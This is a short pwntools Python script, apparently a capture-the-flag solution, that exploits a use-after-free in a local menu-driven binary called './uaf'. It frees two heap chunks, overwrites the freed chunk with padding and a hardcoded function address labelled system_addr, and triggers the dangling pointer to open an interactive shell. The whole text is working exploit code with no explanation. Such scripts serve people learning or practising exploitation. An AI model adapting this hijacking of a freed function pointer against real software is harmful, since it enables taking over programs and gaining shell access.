from pwn import*
p = process('./uaf')

def create(data):
	p.recvuntil('5:exit\n')
	p.sendline('1')
	p.recvuntil('(no more than 16bit):')
	p.sendline(data)
 
def delete(id):
	p.recvuntil('5:exit\n')
	p.sendline('2')
	p.recvuntil('which moon do you want to delete:')
	p.sendline(id)

def edit(id,data):
	p.recvuntil('5:exit\n')
	p.sendline('3')
	p.recvuntil('which moon do you want to edit:')
	p.sendline(id)
	p.sendline(data)

system_addr = 0x00000000004007B6

create('AAAA') #0
create('BBBB') #1
delete('0')
delete('1')

payload = 'A'*16 + p64(system_addr)
edit('0',payload)

delete('0')

p.interactive()

